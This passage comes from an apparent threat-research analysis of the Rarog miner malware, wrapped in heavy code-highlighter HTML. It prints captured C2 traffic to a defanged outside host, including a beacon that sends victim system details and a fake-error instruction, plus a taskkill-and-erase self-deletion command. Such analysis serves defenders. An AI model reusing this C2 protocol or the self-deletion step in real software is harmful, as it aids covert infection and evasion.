			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
POST /2.0/method/checkConnection HTTP/1.1
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 6.1) Rarog/5.0
Content-Length: 0
Host: api.polotreck[.]xyz
HTTP/1.1 200 OK
Server: nginx/1.13.9
Date: Tue, 20 Mar 2018 16:34:10 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 12
Connection: keep-alive
X-Powered-By: PHP/5.6.30-0+deb8u1
c3VjY2Vzcw==</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-676268260c9b4439471035-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-676268260c9b4439471035-2">2</div><div class="crayon-num" data-line="crayon-676268260c9b4439471035-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-676268260c9b4439471035-4">4</div><div class="crayon-num" data-line="crayon-676268260c9b4439471035-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-676268260c9b4439471035-6">6</div><div class="crayon-num" data-line="crayon-676268260c9b4439471035-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-676268260c9b4439471035-8">8</div><div class="crayon-num" data-line="crayon-676268260c9b4439471035-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-676268260c9b4439471035-10">10</div><div class="crayon-num" data-line="crayon-676268260c9b4439471035-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-676268260c9b4439471035-12">12</div><div class="crayon-num" data-line="crayon-676268260c9b4439471035-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-676268260c9b4439471035-14">14</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-676268260c9b4439471035-1"><span class="crayon-i">POST</span><span class="crayon-h"> </span>/<span class="crayon-cn">2.0</span>/<span class="crayon-i">method</span>/<span class="crayon-e">checkConnection </span><span class="crayon-i">HTTP</span>/<span class="crayon-cn">1.1</span></div><div class="crayon-line crayon-striped-line" id="crayon-676268260c9b4439471035-2"><span class="crayon-i">Connection</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">Keep</span>-<span class="crayon-e">Alive</span></div><div class="crayon-line" id="crayon-676268260c9b4439471035-3"><span class="crayon-i">Content</span>-<span class="crayon-i">Type</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">application</span>/<span class="crayon-i">x</span>-<span class="crayon-i">www</span>-<span class="crayon-i">form</span>-<span class="crayon-e">urlencoded</span></div><div class="crayon-line crayon-striped-line" id="crayon-676268260c9b4439471035-4"><span class="crayon-i">User</span>-<span class="crayon-i">Agent</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">Mozilla</span>/<span class="crayon-cn">5.0</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">Windows </span><span class="crayon-i">NT</span><span class="crayon-h"> </span><span class="crayon-cn">6.1</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-i">Rarog</span>/<span class="crayon-cn">5.0</span></div><div class="crayon-line" id="crayon-676268260c9b4439471035-5"><span class="crayon-i">Content</span>-<span class="crayon-i">Length</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-cn">0</span></div><div class="crayon-line crayon-striped-line" id="crayon-676268260c9b4439471035-6"><span class="crayon-i">Host</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">api</span><span class="crayon-sy">.</span><span class="crayon-i">polotreck</span><span class="crayon-sy">[</span><span class="crayon-sy">.</span><span class="crayon-sy">]</span><span class="crayon-e">xyz</span></div><div class="crayon-line" id="crayon-676268260c9b4439471035-7"><span class="crayon-i">HTTP</span>/<span class="crayon-cn">1.1</span><span class="crayon-h"> </span><span class="crayon-cn">200</span><span class="crayon-h"> </span><span class="crayon-e">OK</span></div><div class="crayon-line crayon-striped-line" id="crayon-676268260c9b4439471035-8"><span class="crayon-i">Server</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">nginx</span>/<span class="crayon-cn">1.13.9</span></div><div class="crayon-line" id="crayon-676268260c9b4439471035-9"><span class="crayon-i">Date</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">Tue</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">20</span><span class="crayon-h"> </span><span class="crayon-i">Mar</span><span class="crayon-h"> </span><span class="crayon-cn">2018</span><span class="crayon-h"> </span><span class="crayon-cn">16</span><span class="crayon-sy">:</span><span class="crayon-cn">34</span><span class="crayon-sy">:</span><span class="crayon-cn">10</span><span class="crayon-h"> </span><span class="crayon-e">GMT</span></div><div class="crayon-line crayon-striped-line" id="crayon-676268260c9b4439471035-10"><span class="crayon-i">Content</span>-<span class="crayon-i">Type</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">text</span>/<span class="crayon-i">html</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-i">charset</span>=<span class="crayon-i">UTF</span>-<span class="crayon-cn">8</span></div><div class="crayon-line" id="crayon-676268260c9b4439471035-11"><span class="crayon-i">Content</span>-<span class="crayon-i">Length</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-cn">12</span></div><div class="crayon-line crayon-striped-line" id="crayon-676268260c9b4439471035-12"><span class="crayon-i">Connection</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">keep</span>-<span class="crayon-i">alive</span></div><div class="crayon-line" id="crayon-676268260c9b4439471035-13"><span class="crayon-i">X</span>-<span class="crayon-i">Powered</span>-<span class="crayon-i">By</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">PHP</span>/<span class="crayon-cn">5.6.30</span>-<span class="crayon-cn">0</span>+<span class="crayon-e">deb8u1</span></div><div class="crayon-line crayon-striped-line" id="crayon-676268260c9b4439471035-14"><span class="crayon-i">c3VjY2Vzcw</span>==</div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0003 seconds] -->
<p>The response of the above request is simply base64-encoded and decodes to ‘success’. The response is checked, and if the response of ‘success’ is received, the malware proceeds.<br />
The malware makes the following request to determine if the C2 wishes the malware to spawn a fake error message box:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-676268260c9be660240353" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
POST /2.0/method/error HTTP/1.1
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 6.1) Rarog/5.0
Content-Length: 9
Host: api.polotreck[.]xyz
profile=1
HTTP/1.1 200 OK
Server: nginx/1.13.9
Date: Tue, 20 Mar 2018 16:43:58 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 192
Connection: keep-alive
X-Powered-By: PHP/5.6.30-0+deb8u1
Vary: Accept-Encoding
MTsxO1N5c3RlbSBFcnJvcjtUaGUgcHJvZ3JhbSBjYW4ndCBzdGFydCBiZWNhdXNlIE1TVkNQMTEwLmRsbCBpcyBtaXNzaW5nIGZyb20geW91ciBjb21wdXRlci4gVHJ5IHJlaW5zdGFsbGluZyB0aGUgcHJvZ3JhbSB0byBmaXggdGhpcyBwcm9ibGVtLg==</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-676268260c9be660240353-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-676268260c9be660240353-2">2</div><div class="crayon-num" data-line="crayon-676268260c9be660240353-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-676268260c9be660240353-4">4</div><div class="crayon-num" data-line="crayon-676268260c9be660240353-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-676268260c9be660240353-6">6</div><div class="crayon-num" data-line="crayon-676268260c9be660240353-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-676268260c9be660240353-8">8</div><div class="crayon-num" data-line="crayon-676268260c9be660240353-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-676268260c9be660240353-10">10</div><div class="crayon-num" data-line="crayon-676268260c9be660240353-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-676268260c9be660240353-12">12</div><div class="crayon-num" data-line="crayon-676268260c9be660240353-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-676268260c9be660240353-14">14</div><div class="crayon-num" data-line="crayon-676268260c9be660240353-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-676268260c9be660240353-16">16</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-676268260c9be660240353-1"><span class="crayon-i">POST</span><span class="crayon-h"> </span>/<span class="crayon-cn">2.0</span>/<span class="crayon-i">method</span>/<span class="crayon-e">error </span><span class="crayon-i">HTTP</span>/<span class="crayon-cn">1.1</span></div><div class="crayon-line crayon-striped-line" id="crayon-676268260c9be660240353-2"><span class="crayon-i">Connection</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">Keep</span>-<span class="crayon-e">Alive</span></div><div class="crayon-line" id="crayon-676268260c9be660240353-3"><span class="crayon-i">Content</span>-<span class="crayon-i">Type</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">application</span>/<span class="crayon-i">x</span>-<span class="crayon-i">www</span>-<span class="crayon-i">form</span>-<span class="crayon-e">urlencoded</span></div><div class="crayon-line crayon-striped-line" id="crayon-676268260c9be660240353-4"><span class="crayon-i">User</span>-<span class="crayon-i">Agent</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">Mozilla</span>/<span class="crayon-cn">5.0</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">Windows </span><span class="crayon-i">NT</span><span class="crayon-h"> </span><span class="crayon-cn">6.1</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-i">Rarog</span>/<span class="crayon-cn">5.0</span></div><div class="crayon-line" id="crayon-676268260c9be660240353-5"><span class="crayon-i">Content</span>-<span class="crayon-i">Length</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-cn">9</span></div><div class="crayon-line crayon-striped-line" id="crayon-676268260c9be660240353-6"><span class="crayon-i">Host</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">api</span><span class="crayon-sy">.</span><span class="crayon-i">polotreck</span><span class="crayon-sy">[</span><span class="crayon-sy">.</span><span class="crayon-sy">]</span><span class="crayon-e">xyz</span></div><div class="crayon-line" id="crayon-676268260c9be660240353-7"><span class="crayon-i">profile</span>=<span class="crayon-cn">1</span></div><div class="crayon-line crayon-striped-line" id="crayon-676268260c9be660240353-8"><span class="crayon-i">HTTP</span>/<span class="crayon-cn">1.1</span><span class="crayon-h"> </span><span class="crayon-cn">200</span><span class="crayon-h"> </span><span class="crayon-e">OK</span></div><div class="crayon-line" id="crayon-676268260c9be660240353-9"><span class="crayon-i">Server</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">nginx</span>/<span class="crayon-cn">1.13.9</span></div><div class="crayon-line crayon-striped-line" id="crayon-676268260c9be660240353-10"><span class="crayon-i">Date</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">Tue</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">20</span><span class="crayon-h"> </span><span class="crayon-i">Mar</span><span class="crayon-h"> </span><span class="crayon-cn">2018</span><span class="crayon-h"> </span><span class="crayon-cn">16</span><span class="crayon-sy">:</span><span class="crayon-cn">43</span><span class="crayon-sy">:</span><span class="crayon-cn">58</span><span class="crayon-h"> </span><span class="crayon-e">GMT</span></div><div class="crayon-line" id="crayon-676268260c9be660240353-11"><span class="crayon-i">Content</span>-<span class="crayon-i">Type</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">text</span>/<span class="crayon-i">html</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-i">charset</span>=<span class="crayon-i">UTF</span>-<span class="crayon-cn">8</span></div><div class="crayon-line crayon-striped-line" id="crayon-676268260c9be660240353-12"><span class="crayon-i">Content</span>-<span class="crayon-i">Length</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-cn">192</span></div><div class="crayon-line" id="crayon-676268260c9be660240353-13"><span class="crayon-i">Connection</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">keep</span>-<span class="crayon-i">alive</span></div><div class="crayon-line crayon-striped-line" id="crayon-676268260c9be660240353-14"><span class="crayon-i">X</span>-<span class="crayon-i">Powered</span>-<span class="crayon-i">By</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">PHP</span>/<span class="crayon-cn">5.6.30</span>-<span class="crayon-cn">0</span>+<span class="crayon-e">deb8u1</span></div><div class="crayon-line" id="crayon-676268260c9be660240353-15"><span class="crayon-i">Vary</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">Accept</span>-<span class="crayon-e">Encoding</span></div><div class="crayon-line crayon-striped-line" id="crayon-676268260c9be660240353-16"><span class="crayon-i">MTsxO1N5c3RlbSBFcnJvcjtUaGUgcHJvZ3JhbSBjYW4ndCBzdGFydCBiZWNhdXNlIE1TVkNQMTEwLmRsbCBpcyBtaXNzaW5nIGZyb20geW91ciBjb21wdXRlci4gVHJ5IHJlaW5zdGFsbGluZyB0aGUgcHJvZ3JhbSB0byBmaXggdGhpcyBwcm9ibGVtLg</span>==</div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0003 seconds] -->
<p>The base64 response above decodes to the following:<br />
“1;1;System Error;The program can't start because MSVCP110.dll is missing from your computer. Try reinstalling the program to fix this problem.”<br />
The response is split by ‘;’. The first parameter is hardcoded, while the second is used to specify the type of message box to display. The following options are provided:</p>
<table align="center">
<tbody>
<tr>
<td width="90"><strong>Parameter</strong></td>
<td width="534"><strong>MessageBox Option</strong></td>
</tr>
<tr>
<td width="90">0</td>
<td width="534">No error message displayed.</td>
</tr>
<tr>
<td width="90">1</td>
<td width="534">A stop-sign icon appears in the message box.</td>
</tr>
<tr>
<td width="90">2</td>
<td width="534">A question-mark icon appears in the message box.</td>
</tr>
<tr>
<td width="90">3</td>
<td width="534">An exclamation-point icon appears in the message box.</td>
</tr>
<tr>
<td width="90">4</td>
<td width="534">An icon consisting of a lowercase letter i in a circle appears in the message box.</td>
</tr>
</tbody>
</table>
<p>The third parameter specifies the title of the message box, while the last parameter represents the message. Using the example previously, we are presented with the following message:<br />
<img  class="size-full wp-image-70766 aligncenter lozad"  data-src="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/04/rarog_10.png" alt="rarog_10" width="583" height="204" data-srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/04/rarog_10.png 583w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/04/rarog_10-300x105.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/04/rarog_10-370x129.png 370w" sizes="(max-width: 583px) 100vw, 583px" /></p>
<p style="text-align: center;"><em>Figure 9 Fake error message box displayed by Rarog</em></p>
<p>Finally, Rarog will execute the following command, which will kill the current malware instance, and deleting it from disk.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-676268260c9c0180483002" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
cmd.exe /c taskkill /im 73222ff531ced249bf31f165777696bb20c42d2148938392335f97f5d937182a.exe /f &amp; erase C:\Users\Administrato\Desktop\73222ff531ced249bf31f165777696bb20c42d2148938392335f97f5d937182a.exe &amp; exit</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-676268260c9c0180483002-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-676268260c9c0180483002-1"><span class="crayon-i">cmd</span><span class="crayon-sy">.</span><span class="crayon-i">exe</span><span class="crayon-h"> </span>/<span class="crayon-i">c</span><span class="crayon-h"> </span><span class="crayon-i">taskkill</span><span class="crayon-h"> </span>/<span class="crayon-i">im</span><span class="crayon-h"> </span><span class="crayon-cn">73222ff531ced249bf31f165777696bb20c42d2148938392335f97f5d937182a.exe</span><span class="crayon-h"> </span>/<span class="crayon-i">f</span><span class="crayon-h"> </span>&<span class="crayon-h"> </span><span class="crayon-i">erase</span><span class="crayon-h"> </span><span class="crayon-i">C</span><span class="crayon-sy">:</span><span class="crayon-sy">\</span><span class="crayon-i">Users</span><span class="crayon-sy">\</span><span class="crayon-i">Administrato</span><span class="crayon-sy">\</span><span class="crayon-i">Desktop</span><span class="crayon-sy">\</span><span class="crayon-cn">73222ff531ced249bf31f165777696bb20c42d2148938392335f97f5d937182a.exe</span><span class="crayon-h"> </span>&<span class="crayon-h"> </span><span class="crayon-i">exit</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0001 seconds] -->
<p>&nbsp;<br />
<strong>Post-Installation Routine</strong><br />
After the installation routine completes and a new instance of Isass.exe is spawned, this new instance of Rarog will check for the existence of the following file:</p>
<ul>
<li>C:\ProgramData\{4FCEED6C-B7D9-405B-A844-C3DBF418BF87}\driver.dat</li>
</ul>
<p>If this file does not exist, Rarog will create the necessary hidden directory structure, and make a series of HTTP POST requests. The first request will be to ‘/2.0/method/checkConnection’ to ensure the remote C2 server is alive. The second request is to the following:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-676268260c9c2538767212" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
POST /4.0/method/installSuccess HTTP/1.1
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 6.1) Rarog/5.0
Content-Length: 9
Host: api.polotreck[.]xyz
buildID=5.1&amp;hwid={1efdb526-2d21-11e8-a30c-8c8590105ceb}&amp;profile=1&amp;os=Microsoft Windows 7 Ultimate &amp;platform=x86&amp;processor=Intel(R) Core(TM) i7-7700HQ CPU @ 2.80 GHz&amp;videocard=VMware SVGA 3D
HTTP/1.1 200 OK
Server: nginx/1.13.9
Date: Tue, 20 Mar 2018 16:43:58 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 192
Connection: keep-alive
X-Powered-By: PHP/5.6.30-0+deb8u1
250</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-676268260c9c2538767212-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-676268260c9c2538767212-2">2</div><div class="crayon-num" data-line="crayon-676268260c9c2538767212-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-676268260c9c2538767212-4">4</div><div class="crayon-num" data-line="crayon-676268260c9c2538767212-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-676268260c9c2538767212-6">6</div><div class="crayon-num" data-line="crayon-676268260c9c2538767212-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-676268260c9c2538767212-8">8</div><div class="crayon-num" data-line="crayon-676268260c9c2538767212-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-676268260c9c2538767212-10">10</div><div class="crayon-num" data-line="crayon-676268260c9c2538767212-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-676268260c9c2538767212-12">12</div><div class="crayon-num" data-line="crayon-676268260c9c2538767212-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-676268260c9c2538767212-14">14</div><div class="crayon-num" data-line="crayon-676268260c9c2538767212-15">15</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-676268260c9c2538767212-1"><span class="crayon-i">POST</span><span class="crayon-h"> </span>/<span class="crayon-cn">4.0</span>/<span class="crayon-i">method</span>/<span class="crayon-e">installSuccess </span><span class="crayon-i">HTTP</span>/<span class="crayon-cn">1.1</span></div><div class="crayon-line crayon-striped-line" id="crayon-676268260c9c2538767212-2"><span class="crayon-i">Connection</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">Keep</span>-<span class="crayon-e">Alive</span></div><div class="crayon-line" id="crayon-676268260c9c2538767212-3"><span class="crayon-i">Content</span>-<span class="crayon-i">Type</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">application</span>/<span class="crayon-i">x</span>-<span class="crayon-i">www</span>-<span class="crayon-i">form</span>-<span class="crayon-e">urlencoded</span></div><div class="crayon-line crayon-striped-line" id="crayon-676268260c9c2538767212-4"><span class="crayon-i">User</span>-<span class="crayon-i">Agent</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">Mozilla</span>/<span class="crayon-cn">5.0</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">Windows </span><span class="crayon-i">NT</span><span class="crayon-h"> </span><span class="crayon-cn">6.1</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-i">Rarog</span>/<span class="crayon-cn">5.0</span></div><div class="crayon-line" id="crayon-676268260c9c2538767212-5"><span class="crayon-i">Content</span>-<span class="crayon-i">Length</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-cn">9</span></div><div class="crayon-line crayon-striped-line" id="crayon-676268260c9c2538767212-6"><span class="crayon-i">Host</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">api</span><span class="crayon-sy">.</span><span class="crayon-i">polotreck</span><span class="crayon-sy">[</span><span class="crayon-sy">.</span><span class="crayon-sy">]</span><span class="crayon-e">xyz</span></div><div class="crayon-line" id="crayon-676268260c9c2538767212-7"><span class="crayon-i">buildID</span>=<span class="crayon-cn">5.1</span><span class="crayon-sy">&amp;hwid={1efdb526-2d21-11e8-a30c-8c8590105ceb}&amp;profile=1&amp;os=Microsoft Windows 7 Ultimate &amp;platform=x86&amp;processor=Intel(R) Core(TM) i7-7700HQ CPU @ 2.80 GHz&amp;videocard=VMware SVGA 3D</span></div><div class="crayon-line crayon-striped-line" id="crayon-676268260c9c2538767212-8"><span class="crayon-sy">HTTP/1.1 200 OK</span></div><div class="crayon-line" id="crayon-676268260c9c2538767212-9"><span class="crayon-sy">Server: nginx/1.13.9</span></div><div class="crayon-line crayon-striped-line" id="crayon-676268260c9c2538767212-10"><span class="crayon-sy">Date: Tue, 20 Mar 2018 16:43:58 GMT</span></div><div class="crayon-line" id="crayon-676268260c9c2538767212-11"><span class="crayon-sy">Content-Type: text/html;</span><span class="crayon-h"> </span><span class="crayon-i">charset</span>=<span class="crayon-i">UTF</span>-<span class="crayon-cn">8</span></div><div class="crayon-line crayon-striped-line" id="crayon-676268260c9c2538767212-12"><span class="crayon-i">Content</span>-<span class="crayon-i">Length</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-cn">192</span></div><div class="crayon-line" id="crayon-676268260c9c2538767212-13"><span class="crayon-i">Connection</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">keep</span>-<span class="crayon-i">alive</span></div><div class="crayon-line crayon-striped-line" id="crayon-676268260c9c2538767212-14"><span class="crayon-i">X</span>-<span class="crayon-i">Powered</span>-<span class="crayon-i">By</span><span class="crayon-sy">:</span><span class="crayon-h"> </span><span class="crayon-i">PHP</span>/<span class="crayon-cn">5.6.30</span>-<span class="crayon-cn">0</span>+<span class="crayon-i">deb8u1</span></div><div class="crayon-line" id="crayon-676268260c9c2538767212-15"><span class="crayon-cn">250</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0002 seconds] -->
<p>The response provided by the C2 server is the stored identifier of the victim within the C2 database. This number is stored in the ‘driver.dat’ file.<br />
The following registry key is created to ensure Rarog persists across reboots:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

